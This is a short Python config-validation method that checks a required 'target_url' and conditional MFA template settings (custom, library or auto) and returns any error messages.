    def validate_config(self, config: Dict[str, Any]) -> Optional[List[str]]:
        errors = []
        if not config.get("target_url"):
            errors.append("target_url is required")
        source = config.get("mfa_template_source", "auto")
        if source == "custom" and not config.get("mfa_custom_template"):
            errors.append("mfa_custom_template is required when mfa_template_source is 'custom'")
        if source == "library" and not config.get("mfa_template_id"):
            errors.append("mfa_template_id is required when mfa_template_source is 'library'")
        return errors if errors else None

